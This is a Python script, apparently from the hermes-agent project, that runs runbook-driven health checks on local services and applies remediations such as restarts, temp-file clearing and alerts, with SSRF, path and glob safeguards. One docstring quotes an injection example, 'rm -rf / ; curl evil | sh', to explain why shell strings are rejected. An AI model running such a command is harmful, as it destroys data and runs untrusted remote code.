#!/usr/bin/env python3
"""Monitor -> detect -> remediate runbook engine for local services. stdlib only.

Subcommands:
    check <runbook.json>
        Run every check in the runbook and print a status table. Never
        remediates, regardless of outcome — use this to see current state.
    run <runbook.json> [--confirm]
        Run every check; for each failing check with a matching remediation,
        execute it (--confirm) or print what would run (dry-run, default).
    status
        Quick local health snapshot: agent1 (:11434) / ornith (:1235)
        reachability, disk free % on /, 1-minute load average. Read-only,
        always exits 0.

Runbook-driven `http` checks (arbitrary, caller-supplied URLs) go through
`tools.uptime_check_tool.check_url`, which carries the shared SSRF guard
(scheme allowlist, private/loopback/reserved-address rejection, capped
reads, redirect re-validation) — this script never calls urlopen on a
caller-supplied URL directly. `local_model` checks and `status` are the one
documented exception: they only ever target a hardcoded allowlist of two
loopback endpoints (agent1/ornith, fixed host+port+path, not derived from
runbook input), so they use a narrow loopback-only fetcher instead — see
`_fetch_loopback`. The generic SSRF guard exists to stop an attacker- or
runbook-influenced URL from reaching loopback/metadata addresses; a fixed,
non-parameterized loopback target isn't that case.

Remediation `command`s run via subprocess with list-args only (no
shell=True, no shell string) and are gated behind --confirm; without it,
`run` only prints what it would execute. Exits 2 on runbook parse/
validation errors, 1 if any check failed (after remediation), 0 if all
checks passed.
"""
import argparse
import json
import os
import shutil
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request
from pathlib import Path

# This script is documented to run standalone (`python3 selfheal.py ...`),
# in which case sys.path[0] is this scripts/ dir, not the hermes-agent repo
# root — `import tools` would fail. Insert the repo root so the `tools.*`
# imports below resolve both standalone and under pytest (which already
# puts the repo root on sys.path, making this a no-op there).
_REPO_ROOT = Path(__file__).resolve().parents[4]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

try:
    from tools.notify_tool import notify as ntfy_notify
except ImportError:
    ntfy_notify = None

try:
    from tools.uptime_check_tool import check_url
except ImportError:
    check_url = None

DEFAULT_HTTP_TIMEOUT_S = 15
LOOPBACK_TIMEOUT_S = 5
PROCESS_CHECK_TIMEOUT_S = 5
REMEDIATION_TIMEOUT_S = 30
MAX_LOOPBACK_RESPONSE_BYTES = 65_536
MAX_REMEDIATION_OUTPUT_CHARS = 200
USER_AGENT = "Hermes-Agent-SelfHeal (https://github.com/NousResearch/hermes-agent)"

CHECK_TYPES = {"http", "local_model", "process", "disk", "load"}
ACTION_TYPES = {"restart", "clear-temp", "alert-only"}

_CHECK_REQUIRED_FIELDS = {
    "http": ("url",),
    "local_model": ("name",),
    "process": ("pattern",),
    "disk": ("min_free_pct",),
    "load": ("max_1min",),
}

# Fixed allowlist of local-model-ops health endpoints — see local-model-ops
# skill. Names are validated against this dict; ports/paths never come from
# runbook input, so this stays a narrow, non-parameterized loopback target.
LOCAL_MODEL_ENDPOINTS = {
    "agent1": {"port": 11434, "path": "/api/tags"},
    "ornith": {"port": 1235, "path": "/v1/models"},
}


def _fail(message):
    print(f"error: {message}", file=sys.stderr)
    sys.exit(2)


# --- Runbook loading & validation -------------------------------------------


def load_runbook(path):
    try:
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
    except FileNotFoundError:
        _fail(f"runbook not found: {path}")
    except json.JSONDecodeError as exc:
        _fail(f"runbook {path!r} is not valid JSON: {exc}")
    validate_runbook(data)
    return data


def validate_runbook(data):
    if not isinstance(data, dict):
        _fail("runbook must be a JSON object")
    checks = data.get("checks")
    if not isinstance(checks, list) or not checks:
        _fail("runbook must have a non-empty 'checks' list")

    seen_ids = set()
    for check in checks:
        _validate_check(check, seen_ids)

    remediations = data.get("remediations", [])
    if not isinstance(remediations, list):
        _fail("runbook 'remediations' must be a list")
    for remediation in remediations:
        _validate_remediation(remediation, seen_ids)
    return data


def _validate_check(check, seen_ids):
    if not isinstance(check, dict):
        _fail(f"each check must be an object, got {check!r}")
    check_id = check.get("id")
    check_type = check.get("type")
    if not isinstance(check_id, str) or not check_id:
        _fail(f"check missing a non-empty string 'id': {check!r}")
    if check_id in seen_ids:
        _fail(f"duplicate check id {check_id!r}")
    seen_ids.add(check_id)
    if check_type not in CHECK_TYPES:
        _fail(f"check {check_id!r}: unknown type {check_type!r} (expected one of {sorted(CHECK_TYPES)})")
    missing = [field for field in _CHECK_REQUIRED_FIELDS[check_type] if field not in check]
    if missing:
        _fail(f"check {check_id!r} (type {check_type!r}) missing required field(s): {missing}")


def _validate_remediation(remediation, seen_ids):
    if not isinstance(remediation, dict):
        _fail(f"each remediation must be an object, got {remediation!r}")
    check_id = remediation.get("check_id")
    action = remediation.get("action")
    if check_id not in seen_ids:
        _fail(f"remediation references unknown check_id {check_id!r}")
    if action not in ACTION_TYPES:
        _fail(f"remediation for {check_id!r}: unknown action {action!r} (expected one of {sorted(ACTION_TYPES)})")
    if action == "restart":
        validate_command(remediation)
    if action == "clear-temp" and not remediation.get("path"):
        _fail(f"remediation for {check_id!r}: clear-temp requires 'path'")
    if action == "alert-only" and not remediation.get("topic"):
        _fail(f"remediation for {check_id!r}: alert-only requires 'topic'")


def validate_command(remediation):
    """Return remediation['command'] if it's a non-empty list of non-empty
    strings, else fail. A single shell string (the classic injection shape,
    e.g. "rm -rf / ; curl evil | sh") is rejected outright here — it is
    never handed to a shell, only ever passed to subprocess as argv."""
    command = remediation.get("command")
    check_id = remediation.get("check_id", "?")
    if not isinstance(command, list) or not command or not all(isinstance(c, str) and c for c in command):
        _fail(f"remediation for {check_id!r}: 'command' must be a non-empty list of strings, got {command!r}")
    return command


# --- Loopback fetch (local-model-ops health endpoints only) ----------------


def _fetch_loopback(port, path, timeout):
    """Fetch a fixed, non-parameterized loopback URL. Not a general-purpose
    fetcher — see module docstring for why this bypasses check_url."""
    url = f"http://127.0.0.1:{port}{path}"
    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            response.read(MAX_LOOPBACK_RESPONSE_BYTES)
            return {"ok": True, "status": response.status}
    except urllib.error.HTTPError as exc:
        return {"ok": True, "status": exc.code}
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return {"ok": False, "error": str(exc)}


def check_local_model(name, timeout=LOOPBACK_TIMEOUT_S):
    endpoint = LOCAL_MODEL_ENDPOINTS.get(name)
    if endpoint is None:
        return {"ok": False, "detail": f"unknown local_model name {name!r} (expected one of {sorted(LOCAL_MODEL_ENDPOINTS)})"}
    result = _fetch_loopback(endpoint["port"], endpoint["path"], timeout)
    ok = bool(result.get("ok"))
    detail = f"status={result.get('status')}" if ok else result.get("error", "unreachable")
    return {"ok": ok, "detail": detail}


# --- Check runners -----------------------------------------------------------


def run_http_check(check):
    if check_url is None:
        return {"ok": False, "detail": "uptime_check_tool unavailable (tools package not importable)"}
    result = check_url(
        url=check["url"],
        expect_status=check.get("expect_status"),
        expect_substring=check.get("expect_substring"),
        timeout=check.get("timeout", DEFAULT_HTTP_TIMEOUT_S),
    )
    ok = bool(result.get("up"))
    detail = f"status={result.get('status')} elapsed_ms={result.get('elapsed_ms')}" if ok else result.get("error", "check failed")
    return {"ok": ok, "detail": detail}


def run_local_model_check(check):
    return check_local_model(check.get("name"), timeout=check.get("timeout", LOOPBACK_TIMEOUT_S))


def run_process_check(check):
    pattern = check["pattern"]
    try:
        proc = subprocess.run(["pgrep", "-f", pattern], capture_output=True, text=True, timeout=PROCESS_CHECK_TIMEOUT_S)
    except (OSError, subprocess.SubprocessError) as exc:
        return {"ok": False, "detail": f"pgrep failed: {exc}"}
    ok = proc.returncode == 0
    detail = f"pids={proc.stdout.split()}" if ok else f"no process matching {pattern!r}"
    return {"ok": ok, "detail": detail}


def _disk_free_pct(path):
    usage = shutil.disk_usage(path)
    return (usage.free / usage.total) * 100 if usage.total else 0.0


def run_disk_check(check):
    path = check.get("path", "/")
    min_free_pct = check["min_free_pct"]
    try:
        free_pct = _disk_free_pct(path)
    except OSError as exc:
        return {"ok": False, "detail": f"disk_usage({path!r}) failed: {exc}"}
    ok = free_pct >= min_free_pct
    return {"ok": ok, "detail": f"{free_pct:.1f}% free (threshold {min_free_pct}%)"}


def _load1():
    return os.getloadavg()[0]


def run_load_check(check):
    max_1min = check["max_1min"]
    try:
        load1 = _load1()
    except (OSError, AttributeError) as exc:
        return {"ok": False, "detail": f"getloadavg unavailable: {exc}"}
    ok = load1 <= max_1min
    return {"ok": ok, "detail": f"load1={load1:.2f} (threshold {max_1min})"}


CHECK_RUNNERS = {
    "http": run_http_check,
    "local_model": run_local_model_check,
    "process": run_process_check,
    "disk": run_disk_check,
    "load": run_load_check,
}


def run_check(check):
    outcome = CHECK_RUNNERS[check["type"]](check)
    return {"id": check["id"], "ok": bool(outcome["ok"]), "detail": outcome["detail"]}


def print_status_table(results):
    if not results:
        return
    id_width = max(len(r["id"]) for r in results)
    for r in results:
        status = "PASS" if r["ok"] else "FAIL"
        print(f"{r['id']:<{id_width}}  {status:<4}  {r['detail']}")


# --- Remediation (all gated behind --confirm, except alert-only) -----------


def _allowed_temp_roots():
    """Resolved allowlist of temp roots clear-temp may operate under —
    tempfile.gettempdir(), the conventional /tmp and /var/tmp, and $TMPDIR
    if set. Resolved (symlinks followed) so a root itself isn't rejected by
    the is_relative_to check below."""
    roots = {tempfile.gettempdir(), "/tmp", "/var/tmp"}
    tmpdir_env = os.environ.get("TMPDIR")
    if tmpdir_env:
        roots.add(tmpdir_env)
    return {Path(root).expanduser().resolve() for root in roots}


def _validate_clear_temp_path(path_str):
    if not path_str:
        _fail("clear-temp remediation requires 'path'")
    target = Path(path_str).expanduser().resolve()
    if target == Path("/") or target == Path.home():
        _fail(f"refusing clear-temp on disallowed path {target}")
    if not any(target == root or target.is_relative_to(root) for root in _allowed_temp_roots()):
        _fail(f"refusing clear-temp on {target}: not under an allowed temp root {sorted(str(r) for r in _allowed_temp_roots())}")
    if not target.is_dir():
        _fail(f"clear-temp path {target} is not a directory")
    return target


def run_destructive_command(command, confirm):
    if not confirm:
        return {"ok": True, "dry_run": True, "detail": f"would run: {command}"}
    try:
        proc = subprocess.run(command, capture_output=True, text=True, timeout=REMEDIATION_TIMEOUT_S)
    except subprocess.TimeoutExpired as exc:
        # TimeoutExpired means the command DID start and run — it was
        # killed for exceeding REMEDIATION_TIMEOUT_S, not because it
        # failed to launch. Report that distinctly from a real launch
        # failure (e.g. binary not found).
        return {"ok": False, "detail": f"command timed out after {REMEDIATION_TIMEOUT_S}s (killed): {exc}"}
    except (OSError, subprocess.SubprocessError) as exc:
        return {"ok": False, "detail": f"command failed to start: {exc}"}
    output = (proc.stdout or proc.stderr or "").strip()[:MAX_REMEDIATION_OUTPUT_CHARS]
    return {"ok": proc.returncode == 0, "detail": f"exit={proc.returncode} {output}"}


def clear_temp(remediation, confirm):
    target = _validate_clear_temp_path(remediation.get("path"))
    pattern = remediation.get("pattern", "*")
    # The glob pattern is caller/runbook-controlled. Reject path separators and
    # parent refs outright — `target.glob("../x")` would walk OUTSIDE the
    # validated temp root and delete arbitrary files. A clear-temp pattern is a
    # filename glob, never a path.
    if not isinstance(pattern, str) or "/" in pattern or "\\" in pattern or ".." in pattern:
        _fail(f"clear-temp pattern must be a plain filename glob (no path separators or '..'): {pattern!r}")
    # Defense-in-depth: even with a clean pattern, confine every match to under
    # the validated target (resolve symlinks, reject anything that escapes).
    matches = [
        p
        for p in target.glob(pattern)
        if p.is_file() and p.resolve() != target and p.resolve().is_relative_to(target)
    ]
    if not confirm:
        return {"ok": True, "dry_run": True, "detail": f"would delete {len(matches)} file(s) matching {pattern!r} in {target}"}
    deleted = 0
    for candidate in matches:
        try:
            candidate.unlink()
            deleted += 1
        except OSError:
            continue
    return {"ok": True, "detail": f"deleted {deleted} file(s) in {target}"}


def send_alert(remediation):
    topic = remediation["topic"]
    message = remediation.get("message") or f"selfheal: check {remediation.get('check_id')} failed"
    if ntfy_notify is None:
        print(f"notify_tool unavailable (tools package not importable) — alert not sent: {message}", file=sys.stderr)
        return {"ok": False, "detail": "notify_tool unavailable (tools package not importable)"}
    result = ntfy_notify(message=message, topic=topic)
    ok = bool(result.get("ok"))
    return {"ok": ok, "detail": "sent" if ok else result.get("error", "notify failed")}


def apply_remediation(remediation, confirm):
    action = remediation["action"]
    if action == "alert-only":
        return send_alert(remediation)
    if action == "restart":
        return run_destructive_command(validate_command(remediation), confirm)
    if action == "clear-temp":
        return clear_temp(remediation, confirm)
    return {"ok": False, "detail": f"unknown action {action!r}"}  # unreachable after validate_runbook


# --- Subcommands --------------------------------------------------------


def cmd_check(args):
    runbook = load_runbook(args.runbook)
    results = [run_check(c) for c in runbook["checks"]]
    print_status_table(results)
    return 0 if all(r["ok"] for r in results) else 1


def cmd_run(args):
    runbook = load_runbook(args.runbook)
    results = [run_check(c) for c in runbook["checks"]]
    print_status_table(results)

    remediations_by_check = {r["check_id"]: r for r in runbook.get("remediations", [])}
    all_ok = True
    for result in results:
        if result["ok"]:
            continue
        all_ok = False
        remediation = remediations_by_check.get(result["id"])
        if remediation is None:
            print(f"  [{result['id']}] failed, no remediation configured")
            continue
        outcome = apply_remediation(remediation, args.confirm)
        label = "DRY-RUN" if outcome.get("dry_run") else ("REMEDIATED" if outcome["ok"] else "REMEDIATION-FAILED")
        print(f"  [{result['id']}] {remediation['action']}: {label} - {outcome['detail']}")
    return 0 if all_ok else 1


def cmd_status(args):
    rows = [
        {"id": "agent1(:11434)", **check_local_model("agent1")},
        {"id": "ornith(:1235)", **check_local_model("ornith")},
    ]
    try:
        rows.append({"id": "disk:/", "ok": True, "detail": f"{_disk_free_pct('/'):.1f}% free"})
    except OSError as exc:
        rows.append({"id": "disk:/", "ok": False, "detail": str(exc)})
    try:
        rows.append({"id": "load1", "ok": True, "detail": f"{_load1():.2f}"})
    except (OSError, AttributeError) as exc:
        rows.append({"id": "load1", "ok": False, "detail": str(exc)})
    print_status_table(rows)
    return 0


def build_parser():
    parser = argparse.ArgumentParser(description="Monitor -> detect -> remediate runbook engine for local services.")
    subparsers = parser.add_subparsers(dest="command", required=True)

    check_parser = subparsers.add_parser("check", help="run all checks in a runbook, report status, never remediate")
    check_parser.add_argument("runbook", help="path to runbook JSON")
    check_parser.set_defaults(func=cmd_check)

    run_parser = subparsers.add_parser("run", help="run checks, remediate failures (dry-run unless --confirm)")
    run_parser.add_argument("runbook", help="path to runbook JSON")
    run_parser.add_argument(
        "--confirm",
        action="store_true",
        default=False,
        help="execute gated destructive remediation actions; without this, prints what WOULD run",
    )
    run_parser.set_defaults(func=cmd_run)

    status_parser = subparsers.add_parser("status", help="quick local health snapshot (read-only)")
    status_parser.set_defaults(func=cmd_status)

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
